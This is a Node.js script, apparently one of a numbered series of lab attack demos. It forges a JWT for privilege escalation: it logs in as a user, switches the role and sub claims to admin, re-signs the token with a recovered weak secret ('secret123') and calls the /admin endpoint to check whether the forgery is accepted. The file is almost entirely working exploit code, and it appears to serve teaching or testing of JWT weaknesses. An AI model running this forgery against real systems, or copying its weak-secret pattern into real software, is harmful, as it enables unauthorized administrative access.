/*
 * ATTACK 04 — claim tampering / privilege escalation
 * ---------------------------------------------------
 * Root cause: an authorization-critical claim (role) lives inside the token,
 * and token integrity depends on a secret the attacker can obtain (weak secret,
 * attack #2). Knowing the secret, we take alice's user-level token, flip
 * role:user -> role:admin and change sub, then re-sign so it verifies cleanly.
 *
 * Run:  node attacks/04-claim-tampering.js
 */
const jwt = require('jsonwebtoken');
const { post, getAuth, banner, show, verdict, decodeJwt } = require('./_lib');

const KNOWN_WEAK_SECRET = 'secret123'; // recovered via attack #2

(async () => {
  banner('ATTACK 04 — claim tampering (role: user -> admin)');

  const login = await post('/login', { username: 'alice', password: 'password1' });
  const token = login.body.token || login.body.access_token;
  if (!token) { show('Login failed', login); return; }
  const original = decodeJwt(token);
  show('Original token', token);
  show('Original claims', original.payload);

  // (b) Tamper the claims.
  const tampered = { ...original.payload, sub: 'admin', role: 'admin' };
  const forged = jwt.sign(tampered, KNOWN_WEAK_SECRET, { algorithm: 'HS256' });
  show('Tampered claims', tampered);
  show('Re-signed forged token', forged);

  const res = await getAuth('/admin', forged);
  show(`Server response  (HTTP ${res.status})`, res.body);
  const ok = res.status === 200 && res.body && res.body.secretFlag;
  verdict(ok, ok ? 'tampered admin claim accepted — privilege escalation.'
               : 'tampered token rejected.');
})();
